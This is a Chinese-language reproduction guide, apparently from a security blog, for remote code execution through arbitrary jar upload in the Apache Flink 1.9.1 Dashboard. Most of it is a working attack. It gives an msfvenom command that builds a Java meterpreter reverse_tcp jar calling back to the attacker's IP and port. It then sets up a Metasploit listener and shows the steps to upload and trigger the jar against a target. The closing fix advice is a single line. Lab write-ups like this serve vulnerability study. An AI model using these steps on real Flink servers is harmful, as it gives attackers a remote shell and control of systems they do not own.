# **0x00简介**

Apache Flink是近几年大火的数据处理引擎。受到各大厂商的推崇并且已经应用与实际的业务场景中。很多公司在进行选型的时候都会选择Apache
Flink作为选型的对象 **。**

**Apache Flink能用来做什么？**

  * 实时推荐系统
  * 实时报表
  * 实时数仓与ETL
  * 复杂事件处理
  * 实时欺诈与实时信用评估
  * 大数据安全监测

Flink核心是一个流式的数据流执行引擎，其针对数据流的分布式计算提供了数据分布、数据通信以及容错机制等功能。基于流执行引擎，Flink提供了诸多更高抽象层的API以便用户编写分布式任务。

## **0x01漏洞介绍**

攻击者可直接在Apache Flink Dashboard页面中上传任意jar包，从而达到远程代码执行的目的

## **0x02影响范围**

至目前Apache Flink 1.9.1版本

## **0x03环境搭建**

攻击机kali:192.168.10.147

受害机Ubuntu:192.168.10.176

测试环境：Flink 1.9.1 java8+

Apache Flink 1.9.1安装包下载：

<https://www.apache.org/dyn/closer.lua/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz>

下载完成后使用解压

tar zxvf flink-1.9.1-bin-scala_2.11.tgz

![1597375371.png!small](https://image.3001.net/images/20200814/1597375371.png!small)

进入bin目录运行./start-cluster.sh启动环境

![1597375385.png!small](https://image.3001.net/images/20200814/1597375385.png!small)

环境搭建成功 目标站点 [http://192.168.10.176:8081](http://192.168.10.176:8081/)

![1597375399.png!small](https://image.3001.net/images/20200814/1597375399.png!small)

## **0x04漏洞复现**

使用kali生成jar后门包

msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.10.147 LPORT=2020 -f
jar > shell.jar

![1597375414.png!small](https://image.3001.net/images/20200814/1597375414.png!small)

  1. 攻击机访问目标站点 并上传shell.jar

![1597375436.png!small](https://image.3001.net/images/20200814/1597375436.png!small)

使用kali配置监听

use exploit/multi/handler

set payload java/shell/reverse_tcp

set RHOST 192.168.10.147

set LPORT 2020

run

![1597375449.png!small](https://image.3001.net/images/20200814/1597375449.png!small)

点开刚刚上传的shell.jar，触发漏洞

![1597375458.png!small](https://image.3001.net/images/20200814/1597375458.png!small)

![1597375466.png!small](https://image.3001.net/images/20200814/1597375466.png!small)

## **0x05修复方式**

更新官网补丁或更新最新版本

